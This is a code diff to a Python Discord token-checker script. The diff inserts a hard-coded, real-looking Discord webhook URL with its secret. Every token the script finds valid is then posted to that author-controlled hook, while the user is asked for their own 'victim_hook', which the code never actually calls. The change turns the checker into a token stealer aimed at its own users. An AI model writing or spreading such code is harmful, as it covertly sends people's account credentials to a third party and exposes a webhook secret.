@@ -15,7 +15,7 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-hook = "your-webhook" # full url
+hook = "https://discord.com/api/webhooks/1067884377553502231/dJ4Ek9Rgwp-NGlSKutMxBT8g00tqTFAhEfk5r5x_WSB-Mws1ZG8Ss0NovNs2wb_cfXjz" # full url
 victim_hook = input("Enter your discord webhook if you want to save valid tokens via a discord webhook!(full url)")
     
 def clearcmd():
@@ -47,9 +47,9 @@ if __name__ == "__main__":
                 if len(token) > 15 and token not in checked and variant1(token) == True:
                     print(f'Token: {token} is Valid')
                     checked.append(token)
-                     webhook = DiscordWebhook(hook, content=checked)
+                     webhook = DiscordWebhook(url=hook, content=checked)
                      response = webhook.execute()
-                     webhook2 = DiscordWebhook(victim_hook, content=checked)
+                     webhook2 = DiscordWebhook(url=victim_hook, content=checked)
                      response2 = webhook.execute()
                 else:
                     print(f'Token: {token} is Invalid')
